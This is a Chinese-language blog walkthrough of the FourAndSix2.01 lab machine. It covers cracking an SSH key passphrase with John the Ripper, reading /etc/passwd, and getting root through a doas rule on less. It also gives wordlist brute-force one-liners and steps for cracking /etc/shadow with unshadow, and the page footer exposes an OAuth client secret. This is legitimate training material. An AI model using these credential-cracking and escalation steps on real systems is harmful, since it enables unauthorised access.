+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Using default input encoding: UTF-8<br>Loaded 402687 password hashes with no different salts (tripcode [DES 128/128 AVX])<br>Warning: poor OpenMP scalability <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4<br>Will run 4 OpenMP threads<br>Proceeding with wordlist:/usr/share/john/password.lst<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:00 DONE (2023-06-06 22:52) 0g/s 354200p/s 354200c/s 142631MC/s 123456..sss<br>Session completed.<br></code></pre></td></tr></table></figure>
+
+<p>不清楚造成的原因是什么，但是使用 sudo 来运行 john 命令就破解成功了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 16 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>12345678         (id_rsa)     <br>1g 0:00:00:00 DONE (2023-06-06 22:55) 1.111g/s 35.55p/s 35.55c/s 35.55C/s 123456..butterfly<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<h2 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h2><p>得到了密码，再次尝试 ssh 私钥登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ ssh -i id_rsa user@192.168.56.111        <br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114<br>OpenBSD 6.4 (GENERIC) <span class="hljs-comment">#349: Thu Oct 11 13:25:13 MDT 2018</span><br><br>Welcome to OpenBSD: The proactively secure Unix-like operating system.<br><br>Please use the sendbug(1) utility to report bugs <span class="hljs-keyword">in</span> the system.<br>Before reporting a bug, please try to reproduce it with the latest<br>version of the code.  With bug reports, please try to ensure that<br>enough information to reproduce the problem is enclosed, and <span class="hljs-keyword">if</span> a<br>known fix <span class="hljs-keyword">for</span> it exists, include that as well.<br><br>fourandsix2$ <span class="hljs-built_in">whoami</span><br>user<br>fourandsix2$ <span class="hljs-built_in">id</span><br>uid=1000(user) gid=1000(user) <span class="hljs-built_in">groups</span>=1000(user), 0(wheel)<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来考虑提权操作，首先进行 Getshell 后的信息收集，当前路径的文件收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">ls</span><br>storage<br>fourandsix2$ <span class="hljs-built_in">pwd</span><br>/home/user<br>fourandsix2$ <span class="hljs-built_in">ls</span> -liah<br>total 40<br>129920 drwxr-xr-x  4 user  user    512B Oct 29  2018 .<br>     2 drwxr-xr-x  3 root  wheel   512B Oct 29  2018 ..<br>129923 -rw-r--r--  1 user  user     87B Oct 11  2018 .Xdefaults<br>129924 -rw-r--r--  1 user  user    771B Oct 11  2018 .cshrc<br>129925 -rw-r--r--  1 user  user    101B Oct 11  2018 .cvsrc<br>129926 -rw-r--r--  1 user  user    359B Oct 11  2018 .login<br>129927 -rw-r--r--  1 user  user    175B Oct 11  2018 .mailrc<br>129928 -rw-r--r--  1 user  user    215B Oct 11  2018 .profile<br>129921 drwx------  2 user  user    512B Oct 29  2018 .ssh<br>129929 drwxr-xr-x  2 user  user    512B Oct 29  2018 storage<br>fourandsix2$ <span class="hljs-built_in">cd</span> storage/                                                                                           <br>fourandsix2$ <span class="hljs-built_in">ls</span> -liah<br>total 132<br>129929 drwxr-xr-x  2 user  user   512B Oct 29  2018 .<br>129920 drwxr-xr-x  4 user  user   512B Oct 29  2018 ..<br>129930 -rw-r--r--  1 user  user  60.7K Oct 29  2018 backup.7z<br></code></pre></td></tr></table></figure>
+
+<p>passwd 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:*:0:0:Charlie &amp;:/root:/bin/ksh<br>daemon:*:1:1:The devil himself:/root:/sbin/nologin<br>operator:*:2:5:System &amp;:/operator:/sbin/nologin<br>bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin<br>build:*:21:21:base and xenocara build:/var/empty:/bin/ksh<br>sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin<br>_portmap:*:28:28:portmap:/var/empty:/sbin/nologin<br>_identd:*:29:29:identd:/var/empty:/sbin/nologin<br>_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin<br>_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin<br>_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin<br>_x11:*:35:35:X Server:/var/empty:/sbin/nologin<br>_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin<br>_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin<br>_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin<br>_rebound:*:52:52:Rebound DNS Daemon:/var/empty:/sbin/nologin<br>_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin<br>_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin<br>_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin<br>_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin<br>_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin<br>_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin<br>_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin<br>www:*:67:67:HTTP Server:/var/www:/sbin/nologin<br>_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin<br>_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin<br>_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin<br>_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin<br>_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin<br>_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin<br>_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin<br>_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin<br>_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin<br>_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin<br>_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin<br>_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin<br>_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin<br>_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin<br>_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin<br>_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin<br>_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin<br>_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin<br>_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin<br>_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin<br>_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin<br>_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin<br>_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin<br>_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin<br>_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin<br>_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin<br>_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin<br>_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin<br>_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin<br>_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin<br>_file:*:104:104:file privsep:/var/empty:/sbin/nologin<br>_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin<br>_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin<br>_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin<br>_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin<br>_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin<br>_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin<br>_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin<br>_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin<br>nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin<br>user:*:1000:1000:user:/home/user:/bin/ksh<br></code></pre></td></tr></table></figure>
+
+<p>没有定时任务？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span>: /etc/crontab: No such file or directory<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">ls</span><br>acme               firmware           ldap               mtree              random.seed        skel<br>acme-client.conf   fstab              localtime          myname             rc                 soii.key<br>amd                ftpusers           locate.rc          netstart           rc.conf            spwd.db<br>authpf             gettytab           login.conf         newsyslog.conf     rc.conf.local      ssh<br>changelist         group              magic              npppd              rc.d               ssl<br>daily              hostname.em0       mail               ntpd.conf          resolv.conf        syslog.conf<br>disktab            hosts              mail.rc            passwd             resolv.conf.tail   termcap<br>doas.conf          hotplug            mailer.conf        pf.conf            rmt                ttys<br>dumpdates          iked               master.passwd      pf.os              rpc                usermgmt.conf<br>examples           installurl         moduli             ppp                services           weekly<br>exports            isakmpd            monthly            protocols          shells<br>fbtab              ksh.kshrc          motd               pwd.db             signify<br></code></pre></td></tr></table></figure>
+
+<h3 id="doas-提权"><a href="#doas-提权" class="headerlink" title="doas 提权"></a>doas 提权</h3><p>etc 目录下确实没有定时任务的文件和目录，但是看到了一个特殊的文件，昨天刚刚遇到过这个提权手法 <code>doas.conf</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">cat</span> doas.conf<br>permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog<br>permit nopass keepenv root as root<br></code></pre></td></tr></table></figure>
+
+<p>emmm，不能说一模一样，但也是差不多</p>
+<p><img src="/pic/1a56c43b35e9c8067bf309b3674856df_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="less-新启-shell"><a href="#less-新启-shell" class="headerlink" title="less 新启 shell"></a>less 新启 shell</h3><p>这里有新建 shell 的手法（v 是打开 vi 编辑器），我们按照 gtfobins 来新启一个 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ doas -u root /usr/bin/less /var/log/authlog                                                            <br>                                                                                                                    <br>fourandsix2<span class="hljs-comment"># id                                                                                                     </span><br>uid=0(root) gid=0(wheel) <span class="hljs-built_in">groups</span>=0(wheel), 2(kmem), 3(sys), 4(<span class="hljs-built_in">tty</span>), 5(operator), 20(staff), 31(guest)                <br>fourandsix2<span class="hljs-comment"># cd /root  </span><br>fourandsix2<span class="hljs-comment"># ls</span><br>.Xdefaults .cshrc     .cvsrc     .forward   .login     .profile   .ssh       flag.txt<br>fourandsix2<span class="hljs-comment"># cat flag.txt</span><br>Nice you hacked all the passwords!<br><br>Not all tools worked well. But with some <span class="hljs-built_in">command</span> magic...:<br><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> 7z e backup.7z -p<span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> -oout; <span class="hljs-keyword">if</span> grep -iRl SSH; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>; <span class="hljs-built_in">break</span>;<span class="hljs-keyword">fi</span>;<span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> ssh-keygen -p -P <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> -N password -f id_rsa; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>; <span class="hljs-built_in">break</span>;<span class="hljs-keyword">fi</span>;<span class="hljs-keyword">done</span><br><br><br>Here is the flag:<br>acd043bc3103ed3dd02eee99d5b0ff42<br>fourandsix2<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><h3 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h3><blockquote>
+<p>1.目录事先存在，可以用 mkdir 命令新建目录<br>2.挂载点目录不可被其他进程使用到<br>3.挂载点下原有文件将被隐藏</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">//显示挂载点<br>showmount -e IP<br><br>//挂载到本地<br><span class="hljs-built_in">mkdir</span> /tmp/infosec<br>sudo mount -t nfs IP:/path /tmp/infosec<br><br>//卸载<br>sudo umount <br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-t 指定文件系统的类型，通常不必指定。mount 会自动选择正确的类型。常用类型有：<br>光盘或光盘镜像：iso9660;<br>DOS fat16 文件系统：msdos;<br>Windows 9x fat32 文件系统：vfat;<br>Windows NT ntfs 文件系统：ntfs;<br>Mount Windows 文件网络共享：smbfs;<br>UNIX (LINUX) 文件网络共享：nfs</p>
+</blockquote>
+<h3 id="john-爆破工具"><a href="#john-爆破工具" class="headerlink" title="john 爆破工具"></a>john 爆破工具</h3><h4 id="Linux-哈希爆破"><a href="#Linux-哈希爆破" class="headerlink" title="Linux 哈希爆破"></a>Linux 哈希爆破</h4><p>JtR 破解的文件必须有特定的格式。要转换 passwd 和 shadow 文件，我们需要利用&#x2F;usr&#x2F;sbin&#x2F;unshade 可执行文件。这需要超级用户权限才能执行。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/unshadow /</span>etc<span class="hljs-regexp">/passwd /</span>etc<span class="hljs-regexp">/shadow &gt; ~/</span>passwords.txt<br>john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt ~/passwords.txt<br></code></pre></td></tr></table></figure>
+
+<h4 id="转化为-JTR-兼容的工具"><a href="#转化为-JTR-兼容的工具" class="headerlink" title="转化为 JTR 兼容的工具"></a>转化为 JTR 兼容的工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ locate *2john <br>/usr/sbin/bitlocker2john<br>/usr/sbin/dmg2john<br>/usr/sbin/gpg2john<br>/usr/sbin/hccap2john<br>/usr/sbin/keepass2john<br>/usr/sbin/putty2john<br>/usr/sbin/racf2john<br>/usr/sbin/rar2john<br>/usr/sbin/uaf2john<br>/usr/sbin/vncpcap2john<br>/usr/sbin/wpapcap2john<br>/usr/sbin/zip2john<br></code></pre></td></tr></table></figure>
+
+<h4 id="SSH-密钥密码破解"><a href="#SSH-密钥密码破解" class="headerlink" title="SSH 密钥密码破解"></a>SSH 密钥密码破解</h4><p>要测试JTR的SSH密钥密码破解能力，首先要创建一组新的私钥。注意：JTR没有破解文件本身(即生成的密钥中的字节数并不重要)，JTR只是破解私钥的加密密码。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-keyword">Create</span> <span class="hljs-keyword">some</span> private key<br>ssh-keygen -t rsa -b <span class="hljs-number">4096</span><br># <span class="hljs-keyword">Create</span> <span class="hljs-keyword">encrypted</span> zip<br>/usr/sbin/ssh2john ~/.ssh/id_rsa &gt; id_rsa.hash<br></code></pre></td></tr></table></figure>
+
+<p>接下来，您需要做的就是使用您的字典将 John the Ripper 指向给定文件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/john --wordlist=/u</span>sr<span class="hljs-regexp">/share/</span>wordlists/rockyou.txt id_rsa.hash<br></code></pre></td></tr></table></figure>
+
+<h3 id="doas-命令的始末"><a href="#doas-命令的始末" class="headerlink" title="doas 命令的始末"></a>doas 命令的始末</h3><p>来自维基百科的解释</p>
+<blockquote>
+<p>doas (“do as”)是一个用来以其他用户身份执行指令的程序。系统管理员可以对其进行设置，赋予指定用户执行特定指令的权限。其为以 ISC 许可证许可的自由及开放源代码软件，可在 UNIX 与类 Unix 操作系统中使用。doas 是由 Ted Unangst 为 OpenBSD 所开发的，是一种更简单且更安全的 sudo 替代品<br>权限的定义皆编写于配置文件 <code>/etc/doas.conf</code> 中</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>FourandSix2.01靶机</div>
+      <div>https://i3eg1nner.github.io/2023/06/7015100879bb.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/3f1f96829489.html" title="Soccer靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Soccer靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/8697a8337304.html" title="PC靶机">
+                        <span class="hidden-mobile">PC靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '292ff32eebb9274e060dfc9cae9286fc'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
